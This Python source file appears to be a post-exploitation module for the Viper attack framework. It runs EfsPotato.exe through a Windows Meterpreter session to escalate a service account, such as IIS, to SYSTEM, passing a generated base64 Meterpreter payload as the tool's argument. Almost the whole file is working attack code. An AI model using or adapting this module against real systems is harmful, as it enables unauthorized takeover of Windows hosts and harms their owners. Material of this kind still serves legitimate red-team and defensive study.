# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFCSharpModule):
    NAME_ZH = "EfsPotato提权"
    DESC_ZH = "模块使用EfsPotato.exe进行提权.\n" \
              "EfsPotato.exe一般用于服务权限到SYSTEM权限,例如IIS的提权"

    NAME_EN = "EfsPotato privilege escalation"
    DESC_EN = "模块使用EfsPotato.exe进行提权.\n" \
              "EfsPotato.exe is generally used for service permissions to SYSTEM permissions, such as IIS privilege escalation"

    MODULETYPE = TAG2TYPE.Privilege_Escalation
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", ]  # 所需权限
    ATTCK = ["T1003"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/ir7s9a"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1003/", "https://github.com/viper-sec/EfsPotato"]
    AUTHOR = ["Viper"]
    OPTIONS = register_options([
        OptionHander(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if session.is_windows is not True:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        payload = self.get_handler_payload()
        if "x64" in payload:
            self.set_assembly("EfsPotato-x64")
        else:
            self.set_assembly("EfsPotato-x86")
        self.set_execute_wait(5)
        payload_data = self.generate_payload("base64")
        self.set_arguments(payload_data)
        return True, None

    def callback(self, status, message, data):
        assembly_out = self.get_console_output(status, message, data)
        self.log_raw(assembly_out)
